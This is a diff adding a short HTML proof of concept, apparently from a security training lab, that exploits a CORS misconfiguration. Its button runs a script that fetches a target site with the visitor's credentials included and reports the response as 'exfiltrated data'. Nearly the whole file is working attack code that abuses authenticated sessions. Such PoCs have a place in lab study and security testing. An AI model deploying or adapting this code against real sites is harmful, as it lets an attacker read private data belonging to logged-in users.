@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <h1>CORS Exploitation PoC</h1>
+    <p>Click the button below to exploit the CORS misconfiguration.</p>
+    <button onclick="exploit()">Exploit</button>
+    <script>
+        async function exploit() {
+            try {
+                const response = await fetch('https://anonymizer.offsec.com', {
+                    method: 'GET',
+                    credentials: 'include'
+                });
+                const data = await response.text();
+                console.log("Exfiltrated Data:", data);
+                alert("Data exfiltrated successfully! Check the console for details.");
+            } catch (error) {
+                console.error("Exploitation failed:", error);
+                alert("Exploitation failed. Check the console for details.");
+            }
+        }
+    </script>
+</body>
+</html>
